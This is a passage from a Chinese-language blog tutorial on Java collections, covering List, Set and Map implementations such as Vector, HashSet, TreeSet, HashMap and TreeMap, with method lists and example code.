ArrayList和LinkedList使用场景</h5><p>ArrayList在随机访问方面比较擅长，LinkedList在随机增删方面比较擅长<br>对于需要快速插入，删除元素，使用LinkedList。因为ArrayList要想在数组中任意两个元素中间添加对象时，数组需要移动所有后面的对象。</p><p>Q：那什么时候适合用list呢<br>A：涉及到“栈”、“队列”、“链表”等操作，应该考虑用List，具体的选择哪个List，根据下面的标准来取舍</p><p>对于需要快速插入，删除元素，应该使用LinkedList。<br>对于需要快速随机访问元素，应该使用ArrayList。<br>对于“单线程环境” 或者 “多线程环境，但List仅仅只会被单个线程操作”，此时应该使用非同步的类(如ArrayList)。<br>对于“多线程环境，且List可能同时被多个线程操作”，此时，应该使用同步的类(如<a href="https://www.runoob.com/java/java-vector-class.html" target="_blank" rel="noopener">Vector</a>)。</p><h5 id="2-4-Vector"><a href="#2-4-Vector" class="headerlink" title="2.4 Vector"></a>2.4 Vector</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public class Vector&lt;E&gt;</span><br><span class="line">    extends AbstractList&lt;E&gt;</span><br><span class="line">    implements List&lt;E&gt;, RandomAccess, Cloneable, java.io.Serializable</span><br></pre></td></tr></table></figure><p>Vector 是矢量队列，它是JDK1.0版本添加的类。继承于AbstractList，实现了List, RandomAccess, Cloneable这些接口。<br>Vector 继承了AbstractList，实现了List；所以，它是一个队列，支持相关的添加、删除、修改、遍历等功能。<br>Vector 实现了RandmoAccess接口，即提供了随机访问功能。RandmoAccess是java中用来被List实现，为List提供快速访问功能的。在Vector中，我们即可以通过元素的序号快速获取元素对象；这就是快速随机访问。<br>Vector 实现了Cloneable接口，即实现clone()函数。它能被克隆。和ArrayList不同，Vector中的操作是线程安全的。</p><p>这里不赘述，具体可参考：<a href="https://www.cnblogs.com/msymm/p/9873551.html" target="_blank" rel="noopener">https://www.cnblogs.com/msymm/p/9873551.html</a></p><h5 id="2-5-Stack"><a href="#2-5-Stack" class="headerlink" title="2.5 Stack"></a>2.5 Stack</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">class Stack&lt;E&gt; extends Vector&lt;E&gt;</span><br></pre></td></tr></table></figure><p>Stack是栈，它的特性是：<strong>先进后出</strong>(FILO, First In Last Out)。</p><p>java工具包中的Stack是继承于Vector的，由于Vector是通过数组实现的，这就意味着Stack也是通过数组实现的而非链表。当然，我们也可以将LinkedList当作栈来使用</p><p>这里不赘述，具体可参考：<a href="https://www.cnblogs.com/jpfss/p/11142612.html" target="_blank" rel="noopener">https://www.cnblogs.com/jpfss/p/11142612.html</a></p><h4 id="3、Set"><a href="#3、Set" class="headerlink" title="3、Set"></a>3、Set</h4><p>Set 具有与 Collection 完全一样的接口，只是行为上不同，Set 不保存重复的元素。</p><p>特点：元素唯一、无序。</p><h5 id="3-1-HashSet"><a href="#3-1-HashSet" class="headerlink" title="3.1 HashSet"></a>3.1 HashSet</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public class HashSet&lt;E&gt;</span><br><span class="line">    extends AbstractSet&lt;E&gt;</span><br><span class="line">    implements Set&lt;E&gt;, Cloneable, java.io.Serializable</span><br></pre></td></tr></table></figure><ul><li>HashSet 底层数据结构是哈希表，是元素为链表的数组，具有链表和数组的特点。HashSet不是线程安全的，集合元素可以是null。</li><li>初始容量16，加载因子0.75。</li><li>HashSet集合能够保证元素的唯一性是依靠元素类重写hashCode（）方法和equals（）方法来保证的，如果元素类不重写该方法，则存储该元素的集合不保证元素唯一。</li><li>HashSet底层用的是HashMap来存元素的。</li><li>hashCode()决定索引位置，如果该方法返回一个死值，会造成碰撞次数太多，效率太低。合理地重写hashCode()能有效减少碰撞次数。（对象之间对比的次数）</li></ul><p>常用方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">add(E e)：添加元素</span><br><span class="line">clear()：移除所有元素</span><br><span class="line">remove(Object o)：移除指定元素</span><br><span class="line">isEmpty()：判断是否为空集合</span><br><span class="line">contains(Object o)：判断是否包含指定元素</span><br><span class="line">size()：元素个数</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HashSetTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        HashSetTest hashSetTest = <span class="keyword">new</span> HashSetTest();</span><br><span class="line">        hashSetTest.hashSetTest();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">hashSetTest</span><span class="params">()</span></span>&#123;</span><br><span class="line">        HashSet&lt;Person&gt; hashSet = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">"---------------------重复元素仅添加一次-----------------------------"</span>);</span><br><span class="line">        Person person = <span class="keyword">new</span> Person(<span class="keyword">new</span> String[]&#123;<span class="string">"ipconfig"</span>&#125;);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">            hashSet.add(person);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">"set元素个数："</span>+hashSet.size());</span><br><span class="line">        System.out.println(<span class="string">"---------------------判断是否包含person元素-------------------------"</span>);</span><br><span class="line">        System.out.println(hashSet.contains(person));</span><br><span class="line">        System.out.println(<span class="string">"---------------------移除person元素---------------------------------"</span>);</span><br><span class="line">        System.out.println(<span class="string">"移除中..."</span>);</span><br><span class="line">        hashSet.remove(person);</span><br><span class="line">        System.out.println(<span class="string">"set元素个数："</span>+hashSet.size());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="3-2-TreeSet"><a href="#3-2-TreeSet" class="headerlink" title="3.2 TreeSet"></a>3.2 TreeSet</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">public class TreeSet&lt;E&gt; extends AbstractSet&lt;E&gt;</span><br><span class="line">    implements NavigableSet&lt;E&gt;, Cloneable, java.io.Serializable</span><br></pre></td></tr></table></figure><ul><li>TreeSet 底层数据结构是二叉数，元素唯一，最大的特点是能够对元素进行排序。</li><li>TreeSet不允许存null值</li><li>TreeSet 排序方式分为自然排序和比较器排序。具体使用哪种排序由调用的构造方法决定。空参构造使用的是自然排序，有参构造使用的比较器排序。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">add()：将指定的元素添加到此集合（如果尚未存在）。 </span><br><span class="line">clear()：清除元素</span><br><span class="line">contains()：如果此集合包含指定的元素，则返回 true 。 </span><br><span class="line">first()：返回第一个元素</span><br><span class="line">isEmpty()：如果此集合不包含元素，则返回 true 。 </span><br><span class="line">last()：返回最后一个元素</span><br><span class="line">lower()：返回这个集合中最大的元素严格小于给定的元素，如果没有这样的元素，则返回 null 。 </span><br><span class="line">floor()：返回此集合中最大的元素小于或等于给定元素，如果没有这样的元素，则返回 null 。 </span><br><span class="line">ceiling()：返回此集合中最小元素大于或等于给定元素，如果没有此元素，则返回 null 。 </span><br><span class="line">higher()：返回严格大于给定元素的该集合中的最小元素，如果没有此元素则返回 null 。 </span><br><span class="line">remove()：移除指定元素</span><br><span class="line">size()：元素个数</span><br><span class="line">comparator()：返回用于对该集合中的元素进行排序的比较器，或null，如果此集合使用其元素的natural ordering 。 </span><br><span class="line">headSet()：返回该集合的部分的视图，其元素小于（或等于，如果 inclusive为真） toElement 。 </span><br><span class="line">subSet()：返回该集合的部分的视图，其元素的范围从 fromElement到 toElement 。 </span><br><span class="line">tailSet()：返回此组件的元素大于或等于 fromElement的部分的视图。</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TreeSetTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        TreeSetTest treeSetTest = <span class="keyword">new</span> TreeSetTest();</span><br><span class="line">        treeSetTest.treeSetTest();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">treeSetTest</span><span class="params">()</span></span>&#123;</span><br><span class="line">        TreeSet&lt;String&gt; treeSet = <span class="keyword">new</span> TreeSet&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">            treeSet.add(<span class="string">""</span> + i);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">"---------------------判断是否包含2元素-------------------------"</span>);</span><br><span class="line">        System.out.println(treeSet.contains(<span class="string">"2"</span>));</span><br><span class="line">        System.out.println(<span class="string">"---------------------移除元素---------------------------------"</span>);</span><br><span class="line">        System.out.println(<span class="string">"移除中..."</span>);</span><br><span class="line">        treeSet.remove(<span class="string">"3"</span>);</span><br><span class="line">        System.out.println(<span class="string">"set元素个数："</span>+treeSet.size());</span><br><span class="line">        System.out.println(<span class="string">"---------------------返回第一个元素---------------------------------"</span>);</span><br><span class="line">        System.out.println(treeSet.first());</span><br><span class="line">        System.out.println(<span class="string">"---------------------返回集合小于3的最大元素---------------------------------"</span>);</span><br><span class="line">        System.out.println(treeSet.lower(<span class="string">"3"</span>));</span><br><span class="line">        System.out.println(<span class="string">"---------------------返回集合大于3的最小元素---------------------------------"</span>);</span><br><span class="line">        System.out.println(treeSet.higher(<span class="string">"3"</span>));</span><br><span class="line">        System.out.println(<span class="string">"---------------------返回子集合---------------------------------"</span>);</span><br><span class="line">        System.out.println(treeSet.subSet(<span class="string">"2"</span>,<span class="string">"5"</span>));</span><br><span class="line">        System.out.println(<span class="string">"---------------------返回子集合：元素小于4---------------------------------"</span>);</span><br><span class="line">        System.out.println(treeSet.headSet(<span class="string">"4"</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="三、Map"><a href="#三、Map" class="headerlink" title="三、Map"></a>三、Map</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Map</span><br><span class="line">|__HashMap（重点）</span><br><span class="line">|__TreeMap</span><br></pre></td></tr></table></figure><h4 id="1、Map"><a href="#1、Map" class="headerlink" title="1、Map"></a>1、Map</h4><ul><li><p>Map&lt;K,V&gt;</p><ul><li>K - 此映射所维护的键的类型</li><li>V - 映射值的类型</li></ul></li><li><p>概述</p><p>将键映射到值的对象，一个映射不能包含重复的键，每个键最多只能映射到一个值</p></li><li><p>Map接口和Collection接口的不同</p><ul><li>Map是双列的，Collection是单列的</li><li>Map的键唯一，Collection的子体系Set值是唯一的</li><li>Map集合的数据结构针对键有效，跟值无关;Collection集合的数据结构是针对元素有效</li></ul></li></ul><p>方法：</p><table><thead><tr><th>返回类型</th><th>方法及描述</th></tr></thead><tbody><tr><td>void</td><td>clear(): 从该Map删除所有的映射（可选操作）。</td></tr><tr><td>default V</td><td>compute(K key, BiFunction&lt;? super K,? super V,? extends V&gt; remappingFunction): 尝试计算指定键的映射及其当前映射的值（如果没有当前映射， null ）。</td></tr><tr><td>default V</td><td>computeIfAbsent(K key, Function&lt;? super K,? extends V&gt; mappingFunction): 如果指定的键尚未与值相关联（或映射到 null ），则尝试使用给定的映射函数计算其值，并将其输入到此映射中，除非 null 。</td></tr><tr><td>default V</td><td>computeIfPresent(K key, BiFunction&lt;? super K,? super V,? extends V&gt; remappingFunction): 如果指定的密钥的值存在且非空，则尝试计算给定密钥及其当前映射值的新映射。</td></tr><tr><td>boolean</td><td>containsKey(Object key): 如果此映射包含指定键的映射，则返回 true 。</td></tr><tr><td>boolean</td><td>containsValue(Object value): 如果此Map将一个或多个键映射到指定的值，则返回 true 。</td></tr><tr><td>Set&lt;Map.Entry&lt;K,V&gt;&gt;</td><td>entrySet(): 返回此Map包含的映射的Set视图。</td></tr><tr><td>boolean</td><td>equals(Object o): 将指定的对象与此映射进行比较以获得相等性。</td></tr><tr><td>default void</td><td>forEach(BiConsumer&lt;? super K,? super V&gt; action): 对此映射中的每个条目执行给定的操作，直到所有条目都被处理或操作引发异常。</td></tr><tr><td>V</td><td>get(Object key): 返回到指定键所映射的值，或 null如果此映射包含该键的映射。</td></tr><tr><td>default V</td><td>getOrDefault(Object key, V defaultValue): 返回到指定键所映射的值，或 defaultValue如果此映射包含该键的映射。</td></tr><tr><td>int</td><td>hashCode(): 返回此Map的哈希码值。</td></tr><tr><td>boolean</td><td>isEmpty(): 如果此Map不包含键值映射，则返回 true 。</td></tr><tr><td>Set<K></td><td>keySet(): 返回此Map包含的键的Set视图。</td></tr><tr><td>default V</td><td>merge(K key, V value, BiFunction&lt;? super V,? super V,? extends V&gt; remappingFunction): 如果指定的键尚未与值相关联或与null相关联，则将其与给定的非空值相关联。</td></tr><tr><td>V</td><td>put(K key, V value): 将指定的值与该映射中的指定键相关联（可选操作）。</td></tr><tr><td>void</td><td>putAll(Map&lt;? extends K,? extends V&gt; m): 将指定Map的所有映射复制到此映射（可选操作）。</td></tr><tr><td>default V</td><td>putIfAbsent(K key, V value): 如果指定的键尚未与某个值相关联（或映射到 null ）将其与给定值相关联并返回 null ，否则返回当前值。</td></tr><tr><td>V</td><td>remove(Object key): 如果存在（从可选的操作），从该Map删除一个键的映射。</td></tr><tr><td>default boolean</td><td>remove(Object key, Object value): 仅当指定的密钥当前映射到指定的值时删除该条目。</td></tr><tr><td>default V</td><td>replace(K key, V value): 只有当目标映射到某个值时，才能替换指定键的条目。</td></tr><tr><td>default boolean</td><td>replace(K key, V oldValue, V newValue): 仅当当前映射到指定的值时，才能替换指定键的条目。</td></tr><tr><td>default void</td><td>replaceAll(BiFunction&lt;? super K,? super V,? extends V&gt; function): 将每个条目的值替换为对该条目调用给定函数的结果，直到所有条目都被处理或该函数抛出异常。</td></tr><tr><td>int</td><td>size(): 返回此Map键值映射的数量。</td></tr><tr><td>Collection<V></td><td>values(): 返回此Map包含的值的Collection视图。</td></tr></tbody></table><h4 id="2、HashMap"><a href="#2、HashMap" class="headerlink" title="2、HashMap"></a>2、HashMap</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">public class HashMap&lt;K,V&gt; extends AbstractMap&lt;K,V&gt;</span><br><span class="line">    implements Map&lt;K,V&gt;, Cloneable, Serializable</span><br></pre></td></tr></table></figure><p>HashMap 底层键的数据结构是哈希表，是元素为链表的数组，具有链表和数组的特点。键唯一且无序。HashMap允许使用 null 值和 null 键。</p><p>HashMap在JDK1.8之前采用的是数组加链表的形式实现其数据结构。<br>JDK1.8之后采用数组加链表加红黑树实现。当链表长度超过阈值8之后，不再采用链表结构进行存储，转而采用红黑树结构。红黑树的引入是为了优化查询效率。</p><p>常用方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">通过put(key，value);方法添加元素</span><br><span class="line">通过clear();清除集合</span><br><span class="line">通过get(key);根据键获取值</span><br><span class="line">通过remove(key);根据键移除这一组键值映射关系的数据</span><br><span class="line">通过keySet();获取所有键的set集合</span><br><span class="line">通过values();获取所有值的collection集合</span><br><span class="line">通过entrySet();返回一个键值对的set集合</span><br><span class="line">通过containsKey(key);判断集合中有没有键key</span><br><span class="line">通过containsValue(values);判断集合中有没有值values</span><br><span class="line">通过isEmpty();判断集合是否为空</span><br><span class="line">通过size();获取集合中的键值对的对数</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HashMapTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        HashMapTest hashMapTest = <span class="keyword">new</span> HashMapTest();</span><br><span class="line">        hashMapTest.hashMapTest();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">hashMapTest</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        HashMap&lt;String, Object&gt; hashMap = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        Person person = <span class="keyword">new</span> Person(<span class="keyword">new</span> String[]&#123;<span class="string">"query"</span>, <span class="string">"user"</span>&#125;);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">            hashMap.put(<span class="string">""</span> + i, person);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">"--------获取键为1的值--------------------------"</span>);</span><br><span class="line">        Person p = (Person) hashMap.get(<span class="string">"1"</span>);</span><br><span class="line">        System.out.println(p);</span><br><span class="line">        System.out.println(<span class="string">"--------移除键为1的值--------------------------"</span>);</span><br><span class="line">        Person p1 = (Person) hashMap.remove(<span class="string">"1"</span>);</span><br><span class="line">        System.out.println(p1);</span><br><span class="line">        System.out.println(<span class="string">"--------获取所有的键的集合---------------------"</span>);</span><br><span class="line">        <span class="keyword">for</span> (String s : hashMap.keySet()) &#123;</span><br><span class="line">            System.out.print(s + <span class="string">" "</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">"\n"</span> + <span class="string">"--------获取所有的键值对的集合-----------------"</span>);</span><br><span class="line">        <span class="keyword">for</span> (Map.Entry entry : hashMap.entrySet()) &#123;</span><br><span class="line">            System.out.println(entry.getKey() + <span class="string">":"</span> + entry.getValue());</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">"-------判断是否存在键为2的键值对---------------"</span>);</span><br><span class="line">        System.out.println(hashMap.containsKey(<span class="string">"2"</span>));</span><br><span class="line">        System.out.println(<span class="string">"-------判断是否存在值为person的键值对----------"</span>);</span><br><span class="line">        System.out.println(hashMap.containsValue(person));</span><br><span class="line">        System.out.println(<span class="string">"-------获取键值对个数--------------------------"</span>);</span><br><span class="line">        System.out.println(hashMap.size());</span><br><span class="line">        System.out.println(<span class="string">"-------清除所有元素----------------------------"</span>);</span><br><span class="line">        System.out.println(<span class="string">"清除中..."</span>);</span><br><span class="line">        hashMap.clear();</span><br><span class="line">        System.out.println(<span class="string">"-------判断map是否为空--------------------------"</span>);</span><br><span class="line">        System.out.println(hashMap.isEmpty());</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="3、TreeMap"><a href="#3、TreeMap" class="headerlink" title="3、TreeMap"></a>3、TreeMap</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public class TreeMap&lt;K,V&gt;</span><br><span class="line">    extends AbstractMap&lt;K,V&gt;</span><br><span class="line">    implements NavigableMap&lt;K,V&gt;, Cloneable, java.io.Serializable</span><br></pre></td></tr></table></figure><p>TreeMap 键的数据结构是红黑树结构。键可以排序且唯一。TreeMap 键不允许插入null。</p><p>排序分为自然排序和比较器排序 ，线程是不安全的，但效率比较高</p><p>自然排序（空参构造）</p><p>常用方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">put(K key, V value)：将指定的值与此映射中的指定键相关联。 </span><br><span class="line">void clear()：从地图中删除所有键值对。</span><br><span class="line">void size()：返回此映射中存在的键值对的数量。</span><br><span class="line">void isEmpty()：如果此映射不包含键-值映射，则返回true。</span><br><span class="line">boolean containsKey(Object key)：&#39;true&#39;如果地图中存在指定的键，则返回。</span><br><span class="line">containsValue(对象键)：返回&#39;true&#39;如果一个指定的值被映射到地图上的至少一个键。</span><br><span class="line">Object get（Object key）：检索value指定的映射key，如果此映射不包含键的映射，则返回null。</span><br><span class="line">Object remove（Object key）：从地图中删除指定键的键值对（如果存在）。</span><br><span class="line">comparator comparator()：返回用于对此映射中的键进行排序的比较器，如果此映射使用其键的自然顺序，则返回null。</span><br><span class="line">Object firstKey()：返回树映射中当前的第一个（最少）键。</span><br><span class="line">Object lastKey()：返回树映射中当前的最后一个（最大）键。</span><br><span class="line">Object ceilingKey（Object key）：返回大于或等于给定键的最小键，如果没有这样的键则返回null。</span><br><span class="line">Object higherKey（Object key）：返回严格大于指定键的最小键。</span><br><span class="line">subMap(K fromKey, boolean fromInclusive, K toKey, boolean toInclusive)：返回此地图部分的视图，其关键范围为 fromKey至 toKey </span><br><span class="line">NavigableMap descendingMap()：返回此映射中包含的映射的逆序视图。</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TreeMapTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        TreeMapTest treeMapTest = <span class="keyword">new</span> TreeMapTest();</span><br><span class="line">        treeMapTest.treeMapTeet();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">treeMapTeet</span><span class="params">()</span></span>&#123;</span><br><span class="line">        TreeMap&lt;String,Object&gt; treeMap = <span class="keyword">new</span> TreeMap&lt;&gt;();</span><br><span class="line">        treeMap.put(<span class="string">"1"</span>,<span class="string">"中国"</span>);</span><br><span class="line">        treeMap.put(<span class="string">"2"</span>,<span class="string">"北京"</span>);</span><br><span class="line">        treeMap.put(<span class="string">"3"</span>,<span class="string">"河北"</span>);</span><br><span class="line">        treeMap.put(<span class="string">"4"</span>,<span class="string">"石家庄"</span>);</span><br><span class="line">        System.out.println(<span class="string">"-------获取键值对个数--------------------------"</span>);</span><br><span class="line">        System.out.println(treeMap.size());</span><br><span class="line">        System.out.println(<span class="string">"--------获取键为1的值--------------------------"</span>);</span><br><span class="line">        System.out.println(treeMap.get(<span class="string">"1"</span>));</span><br><span class="line">        System.out.println(<span class="string">"--------获取子地图-----------------------------"</span>);</span><br><span class="line">        System.out.println(treeMap.subMap(<span class="string">"2"</span>,<span class="string">"4"</span>));</span><br><span class="line">        System.out.println(<span class="string">"-------获取所有键值对--------------------------"</span>);</span><br><span class="line">        System.out.println(treeMap.entrySet());</span><br><span class="line">        System.out.println(<span class="string">"-------判断是否存在键为2的键值对---------------"</span>);</span><br><span class="line">        System.out.println(treeMap.containsKey(<span class="string">"2"</span>));</span><br><span class="line">        System.out.println(<span class="string">"-------判断是否存在值为河北的键值对----------"</span>);</span><br><span class="line">        System.out.println(treeMap.containsValue(<span class="string">"河北"</span>));</span><br><span class="line">        System.out.println(<span class="string">"-------清除所有元素----------------------------"</span>);</span><br><span class="line">        System.out.println(<span class="string">"清除中..."</span>);</span><br><span class="line">        treeMap.clear();</span><br><span class="line">        System.out.println(<span class="string">"-------判断map是否为空--------------------------"</span>);</span><br><span class="line">        System.out.println(treeMap.isEmpty());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="四、集合常用类"><a href="#四、集合常用类" class="headerlink" title="四、集合常用类"></a>四、集合常用类</h3><ul><li><p>概述：针对集合操作的工具类</p></li><li><p>常用方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public static &lt;T&gt; void sort(List&lt;T&gt; list):                    排序,默认按照自然顺序</span><br><span class="line">public static &lt;T&gt; int binarySearch(List&lt;?&gt; list,T key):        二分查找</span><br><span class="line">public static &lt;T&gt; T max(Collection&lt;?&gt; coll):                获取最大值</span><br><span class="line">public static void reverse(List&lt;?&gt; list):                    反转</span><br><span class="line">public static void shuffle(List&lt;?&gt; list):                    随机置换</span><br></pre></td></tr></table></figure></li></ul><p><strong>参考链接：</strong></p><p><a href="https://www.kuangstudy.com/bbs/1374913932954726401" target="_blank" rel="noopener">https://www.kuangstudy.com/bbs/1374913932954726401</a><br><a href="https://www.kuangstudy.com/bbs/1374914155043123201" target="_blank" rel="noopener">https://www.kuangstudy.com/bbs/1374914155043123201</a><br><a href="https://www.cnblogs.com/bingyimeiling/p/10255037.html" target="_blank" rel="noopener">https://www.cnblogs.com/bingyimeiling/p/10255037.html</a><br><a href="https://www.kuangstudy.com/bbs/1374621719079198721" target="_blank" rel="noopener">https://www.kuangstudy.com/bbs/1374621719079198721</a><br><a href="https://www.kuangstudy.com/bbs/1382900026476445698" target="_blank" rel="noopener">https://www.kuangstudy.com/bbs/1382900026476445698</a><br><a href="https://baijiahao.baidu.com/s?id=1675325359769184918&amp;wfr=spider&amp;for=pc" target="_blank" rel="noopener">https://baijiahao.baidu.com/s?id=1675325359769184918&amp;wfr=spider&amp;for=pc</a><br><a href="https://blog.csdn.net/weixin_42139757/article/details/82108515" target="_blank" 